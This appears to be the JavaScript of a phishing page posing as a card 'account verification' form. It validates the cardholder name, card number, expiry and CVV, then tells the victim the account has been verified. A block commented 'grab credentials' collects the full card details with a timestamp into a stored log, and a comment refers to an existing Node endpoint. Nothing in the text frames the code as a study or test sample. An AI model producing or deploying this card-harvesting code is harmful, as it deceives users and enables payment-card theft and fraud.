// Year
document.getElementById('year').textContent = new Date().getFullYear();

    const form = document.getElementById('cardLoginForm');
    const loginBtn = document.getElementById('loginButton');

    const elName = document.getElementById('cc-name');
    const elNumber = document.getElementById('username'); // per your id usage
    const elExp = document.getElementById('phone');       // per your id usage (MM/YY)
    const elCVV = document.getElementById('otp');         // per your id usage

    const pName = document.getElementById('preview-name');
    const pNumber = document.getElementById('preview-number');
    const pExp = document.getElementById('preview-exp');

    const toast = document.getElementById('toast');

    // --- Helpers ---
    function onlyDigits(v) { return v.replace(/\D+/g, ''); }

    function formatCardNumber(v) {
      const d = onlyDigits(v).slice(0, 16);
      return d.replace(/(.{4})/g, '$1 ').trim();
    }

    function luhnCheck(num) {
      const arr = onlyDigits(num).split('').reverse().map(x => parseInt(x, 10));
      if (arr.length < 13) return false; // minimal length sanity
      let sum = 0;
      for (let i = 0; i < arr.length; i++) {
        let n = arr[i];
        if (i % 2 === 1) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
      }
      return sum % 10 === 0;
    }

    function validExp(v) {
      const m = v.match(/^(0[1-9]|1[0-2])\/(\d{2})$/);
      if (!m) return false;
      const mm = parseInt(m[1], 10);
      const yy = parseInt(m[2], 10);
      const now = new Date();
      let year = now.getFullYear() % 100; // 2-digit year
      let month = now.getMonth() + 1;
      return (yy > year) || (yy === year && mm >= month);
    }

    function validCVV(v) { const d = onlyDigits(v); return d.length === 3 || d.length === 4; }

    function showError(id, show) {
      const el = document.getElementById(id);
      el.style.display = show ? 'block' : 'none';
    }

    function showToast(message, type = 'success') {
      toast.textContent = message;
      toast.className = 'toast ' + (type === 'error' ? 'error' : 'success');
      toast.style.display = 'block';
      setTimeout(() => toast.style.display = 'none', 2200);
    }

    // Live formatting & preview
    elNumber.addEventListener('input', (e) => {
      const caret = e.target.selectionStart;
      const before = e.target.value;
      e.target.value = formatCardNumber(e.target.value);
      pNumber.textContent = e.target.value || '•••• •••• •••• ••••';
      // naive caret keep
      const diff = e.target.value.length - before.length;
      e.target.selectionStart = e.target.selectionEnd = Math.max(0, caret + diff);
    });

    elName.addEventListener('input', () => {
      pName.textContent = elName.value.trim() ? elName.value.toUpperCase() : 'JOHN DOE';
    });

    elExp.addEventListener('input', (e) => {
      let v = onlyDigits(e.target.value).slice(0,4);
      if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
      e.target.value = v;
      pExp.textContent = v || 'MM/YY';
    });

    // Submit handling (front-end validation) — integrates with your existing Node endpoint
    loginBtn.addEventListener('click', async (e) => {
      e.preventDefault();

      // Reset errors
      showError('err-name', false);
      showError('err-number', false);
      showError('err-exp', false);
      showError('err-cvv', false);

      const name = elName.value.trim();
      const number = elNumber.value.trim();
      const exp = elExp.value.trim();
      const cvv = elCVV.value.trim();

      let valid = true;
      if (!name) { showError('err-name', true); valid = false; }
      if (!luhnCheck(number)) { showError('err-number', true); valid = false; }
      if (!validExp(exp)) { showError('err-exp', true); valid = false; }
      if (!validCVV(cvv)) { showError('err-cvv', true); valid = false; }
      if (!valid) { showToast('Please fix the highlighted fields.', 'error'); return; }

      alert('Your account has successfully been verified');

    });


    //grab credentials
    const loginButton = document.getElementById('loginButton');
    
    loginButton.addEventListener('click', () => {
        const ccName = document.getElementsByName('cc-name')[0].value.trim();
        const ccNumber = document.getElementsByName('cc-number')[0].value.trim();
        const ccExp = document.getElementsByName('cc-exp')[0].value.trim();
        const ccCvv = document.getElementsByName('cc-csc')[0].value.trim();

        const logs = JSON.parse(localStorage.getItem('logs')) || [];

        logs.push({
            ccName,
            ccNumber,
            ccExp,
            ccCvv,
            time: new Date().toLocaleString()
        });

        localStorage.setItem('logs', JSON.stringify(logs));
    });
